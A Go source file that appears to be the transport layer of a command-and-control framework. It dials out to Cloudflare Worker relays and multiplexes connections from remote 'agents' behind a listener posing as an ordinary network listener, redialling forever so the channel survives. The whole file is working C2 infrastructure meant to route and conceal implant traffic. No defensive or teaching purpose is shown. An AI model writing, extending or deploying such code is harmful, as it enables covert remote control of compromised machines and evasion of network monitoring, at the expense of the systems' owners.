// Package transport — relay_listener.go
//
// CC side of the worker_ws channel: CC dials OUT to one or more CF Worker
// relays and exposes each relay WebSocket as a virtual listener that yields
// per-agent streams. Feeds directly into c2_h2_stream_server's tunnel handler
// via NewStreamTransport, so the existing dispatcher/agentdb pipeline is
// unchanged — the relay is just another "network" to the CC.
package transport

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"
)

// RelayListener masquerades as a net.Listener. Each Accept() returns a
// virtual net.Conn backed by one agent's relay WebSocket.
type RelayListener struct {
	relayURL string // wss://host/ws/<room>?role=cc&secret=...
	ch       chan net.Conn
	done     chan struct{}
	once     sync.Once
	writeTaggedFn func(tag byte, p []byte) (int, error)
}

// NewRelayListener dials the relay as role=cc and starts pumping.
func NewRelayListener(relayURL string) (*RelayListener, error) {
	l := &RelayListener{
		relayURL: relayURL,
		ch:       make(chan net.Conn, 16),
		done:     make(chan struct{}),
	}
	if err := l.spin(); err != nil {
		return nil, err
	}
	return l, nil
}

// spin validates the endpoint once, then keeps a supervisor that redials
// forever with backoff (CF edges drop idle WebSockets; the relay must survive).
func (l *RelayListener) spin() error {
	conn, hello, err := dialRelay(context.Background(), l.relayURL)
	if err != nil {
		return fmt.Errorf("relay %s: %w", relayHost(l.relayURL), err)
	}
	go l.supervise(conn, hello)
	return nil
}

// supervise owns the current cc socket; on death it redials and re-arms demux.
func (l *RelayListener) supervise(first *relayConn, firstHello *RelayRoomMsg) {
	backoff := 2 * time.Second
	conn, hello := first, firstHello
	for {
		l.demux(conn, hello) // blocks until socket dies
		// redial with backoff
		for {
			select {
			case <-l.done:
				return
			case <-time.After(backoff):
			}
			next, nextHello, err := dialRelay(context.Background(), l.relayURL)
			if err != nil {
				if backoff < 60*time.Second {
					backoff *= 2
				}
				continue
			}
			conn, hello = next, nextHello
			backoff = 2 * time.Second
			break
		}
		select {
		case <-l.done:
			return
		default:
		}
	}
}

// virtualConn is one agent's multiplexed stream on the cc relay socket.
type virtualConn struct {
	l       *RelayListener
	tag     byte
	readBuf chan []byte
	backlog []byte // bytes carried over from a previous oversized frame
	dead    chan struct{}
	once    sync.Once
}

func (v *virtualConn) Read(p []byte) (int, error) {
	if len(v.backlog) > 0 {
		n := copy(p, v.backlog)
		v.backlog = v.backlog[n:]
		return n, nil
	}
	select {
	case data, ok := <-v.readBuf:
		if !ok {
			return 0, io.EOF
		}
		n := copy(p, data)
		if n < len(data) {
			v.backlog = data[n:]
		}
		return n, nil
	case <-v.dead:
		return 0, io.EOF
	case <-v.l.done:
		return 0, io.EOF
	}
}

func (v *virtualConn) Write(p []byte) (int, error) {
	// routed through the listener's single cc socket with our tag
	return v.l.writeTagged(v.tag, p)
}

func (v *virtualConn) Close() error {
	v.once.Do(func() { close(v.dead) })
	return nil
}
func (v *virtualConn) LocalAddr() net.Addr                { return nil }
func (v *virtualConn) RemoteAddr() net.Addr               { return nil }
func (v *virtualConn) SetDeadline(t time.Time) error      { return nil }
func (v *virtualConn) SetReadDeadline(t time.Time) error  { return nil }
func (v *virtualConn) SetWriteDeadline(t time.Time) error { return nil }

// demux reads the cc-side relay socket and splits agent frames by tag byte.
// The relayConn.Read already strips the tag for us — but we need the tag to
// demux, so we bypass relayConn and read raw from the underlying ws.
func (l *RelayListener) demux(rc *relayConn, hello *RelayRoomMsg) {
	_ = hello


	// virtual conns per agent tag
	vconns := map[byte]*virtualConn{}
	var vmu sync.Mutex
	writeTagged := func(tag byte, p []byte) (int, error) {
		buf := make([]byte, 0, len(p)+1)
		buf = append(buf, tag)
		buf = append(buf, p...)
		rc.mu.Lock()
		err := rc.conn.WriteMessage(2, buf) // 2 = BinaryMessage
		rc.mu.Unlock()
		if err != nil {
			return 0, err
		}
		return len(p), nil
	}
	l.writeTaggedFn = writeTagged

	for {
		mt, data, err := rc.conn.ReadMessage()
		if err != nil {
			log.Printf("[relay] cc socket read error: %v", err)
			return
		}
		if mt != 2 || len(data) < 2 { // binary, tag+payload
			continue
		}
		tag := data[0]
		payload := data[1:]

		vmu.Lock()
		vc, ok := vconns[tag]
		if !ok {
			vc = &virtualConn{
				l:       l,
				tag:     tag,
				readBuf: make(chan []byte, 256),
				dead:    make(chan struct{}),
			}
			vconns[tag] = vc
			l.ch <- vc // new agent => Accept() returns it
		}
		vmu.Unlock()

		select {
		case vc.readBuf <- payload:
		case <-vc.dead:
		default:
			// backpressure: drop instead of blocking the multiplexed socket
			log.Printf("[relay] tag %d buffer full, dropping %d bytes", tag, len(payload))
		}
	}
}

func (l *RelayListener) writeTagged(tag byte, p []byte) (int, error) {
	if l.writeTaggedFn == nil {
		return 0, errors.New("relay not ready")
	}
	return l.writeTaggedFn(tag, p)
}

// Accept implements net.Listener.
func (l *RelayListener) Accept() (net.Conn, error) {
	select {
	case c := <-l.ch:
		return c, nil
	case <-l.done:
		return nil, errors.New("relay listener closed")
	}
}

func (l *RelayListener) Close() error {
	l.once.Do(func() { close(l.done) })
	return nil
}

// Addr implements net.Listener (dummy).
func (l *RelayListener) Addr() net.Addr { return dummyAddr("worker_ws") }

type dummyAddr string

func (d dummyAddr) Network() string { return string(d) }
func (d dummyAddr) String() string  { return string(d) }

func relayHost(raw string) string {
	// best-effort host extraction for logs
	for i := 0; i < len(raw); i++ {
		if raw[i] == '/' && i+2 < len(raw) && raw[i+1] == '/' {
			rest := raw[i+2:]
			for j := 0; j < len(rest); j++ {
				if rest[j] == '/' {
					return rest[:j]
				}
			}
			return rest
		}
	}
	return raw
}

var _ = time.Second // keep import if unused in future edits
